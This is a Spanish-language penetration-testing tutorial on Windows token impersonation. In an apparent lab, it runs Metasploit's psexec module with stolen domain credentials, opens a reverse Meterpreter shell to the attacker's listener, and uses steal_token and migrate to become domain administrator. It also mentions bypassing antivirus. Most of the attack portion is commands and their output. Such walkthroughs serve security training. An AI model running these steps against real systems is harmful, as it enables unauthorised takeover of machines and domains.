---
icon: blog
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Token impersonation

Esta tecnica se vaya en obtener el `Token` de acceso de un usuario en las `logon sessions` y utilizar dicho `token` para suplantarlo como dicho usuario y ejecutar cosas como dicho usuario, explicado asi de forma resumida.

Para ello vamos a utilizar `metasploit` ya que contiene `meterpreter` un comandito que facilita todo esto.

Si no tenemos `metasploit` instalado, lo instalaremos de la siguiente forma:

```shell
sudo apt install metasploit-framework
```

Entramos dentro del el, de la siguiente forma:

```shell
msfconsole -q
```

Pongamos que hemos comprometido las credenciales del usuario `empleado1` que seria `Passw0rd2` y tendremos que desactivar el antivirus del equipo `empleado1`, lo podriamos hacer con un codigo ofuscado con `msfvenom` o haciendo un `bypass` del antivirus, pero vamos hacerlo de forma sencilla para que se vea bien, por lo que lo desactivaremos y haremos lo siguiente:

```shell
use exploit/windows/smb/psexec
```

Esto lo estamos haciendo dentro del `metasploit` por que quiero utilizar el `meterpreter` ya que tiene unos comandos bastante sencillitos para realizar la tecnica de `Token impersonation`.

Una vez dentro del modulo, haremos lo siguiente:

```shell
set RHOSTS 192.168.5.208
set SMBDOMAIN CORP
set SMBPASS Passw0rd2
set SMBUSER empleado1
set LHOST 192.168.5.205
set LPORT 7777
exploit
```

Info:

```
[*] Started reverse TCP handler on 192.168.5.205:7777 
[*] 192.168.5.208:445 - Connecting to the server...
[*] 192.168.5.208:445 - Authenticating to 192.168.5.208:445|CORP as user 'empleado1'...
[*] 192.168.5.208:445 - Selecting PowerShell target
[*] 192.168.5.208:445 - Executing the payload...
[+] 192.168.5.208:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (177734 bytes) to 192.168.5.208
[*] Meterpreter session 1 opened (192.168.5.205:7777 -> 192.168.5.208:55999) at 2025-01-25 06:45:59 -0500

meterpreter >
```

Y vemos que nos creo una `shell` adecuadamente con `meterpreter`.

Si vemos que usuario somos:

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Vemos que somo el `AUTHORITY\SYSTEM` ya que este usuario tiene privilegios de `administrador` en la maquina de forma local, por lo que `metasploit` ya se encarga de escalar y darnos dicho usuario.

Pero a nivel de `dominio` seremos un usuario normal en este caso, por lo que vamos a iniciar un `PowerShell` como el usuario `Administrador` pero del `dominio` para que se cree un `Token` de acceso con dicho usuario en la maquina de `empleado1`.

Una vez echo esto anterior, si volvemos a `metasploit` haremos lo siguiente:

```shell
meterpreter > ps
```

Poniendo eso, veremos todos los procesos que se estan corriendo en la maquina y si observamos la siguiente linea de proceso:

```
3140  4036  powershell.exe               x64   1        CORP\Administrator            C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

Vemos que hay un `PowerShell` como el usuario `Administrador` de dominio corriendo en ese equipo.

Ahora lo que vamos hacer es robar el `token` del proceso que queremos en mi caso del `3140`, por lo que haremos lo siguiente:

```shell
meterpreter > steal_token 3140
```

Info:

```
Stolen token with username: CORP\Administrator
```

Como vemos ha funcionado y estaremos autenticado bajo ese usuario, si probamos a ver que usuario somos ahora:

```shell
meterpreter > getuid
Server username: CORP\Administrator
```

Veremos que somos el usuario `administrador` del dominio, por lo que habremos comprometido la maquina completamente.

Pero a parte de robar el `token` lo que tambien podremos hacer es migarar al proceso que queremos donde el usuario esta ejecutando ese proceso del cual queremos ser entre comillas que va a estar autenticado con su `token` de acceso.

Tendremos que hacer lo siguiente:

```shell
meterpreter > migrate 3140
```

Info:

```
[*] Migrating from 3812 to 3140...
[*] Migration completed successfully.
```

Ahora si vemos que usuario somos:

```shell
meterpreter > getuid
Server username: CORP\Administrator
```

Vemos que somos el usuario `Administrador` del dominio de nuevo.

Pero es mas recomendable robar el `Token`de acceso para un caso practico real.
